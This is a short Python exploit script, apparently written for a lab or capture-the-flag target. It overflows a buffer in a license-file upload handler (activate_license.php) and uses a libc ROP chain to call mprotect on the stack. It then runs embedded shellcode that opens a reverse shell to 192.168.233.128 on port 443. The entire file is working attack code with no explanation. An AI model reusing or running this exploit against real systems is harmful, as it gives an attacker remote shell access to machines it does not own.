#!/usr/bin/python3
from pwn import p64
import requests

offset = 520
junk = b"A" * offset

libc_base = 0x7ffff7b56000

stack_start = 0x7ffffffde000
stack_end = 0x7ffffffff000
stack_size = stack_end - stack_start

mprotect = p64(libc_base + 0xf8c20)
pop_rdi = p64(libc_base + 0x26796)
pop_rsi = p64(libc_base + 0x2890f)
pop_rdx = p64(libc_base + 0xcb1cd)
call_rsp = p64(libc_base + 0x27a5e)

shellcode =  b""
shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
shellcode += b"\x05\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8"
shellcode += b"\xe9\x80\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"
shellcode += b"\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21"
shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"

payload =  b""
payload += junk
payload += pop_rdi + p64(stack_start)
payload += pop_rsi + p64(stack_size)
payload += pop_rdx + p64(7)
payload += mprotect
payload += call_rsp
payload += shellcode

requests.post("http://localhost/activate_license.php", files={"licensefile": payload})
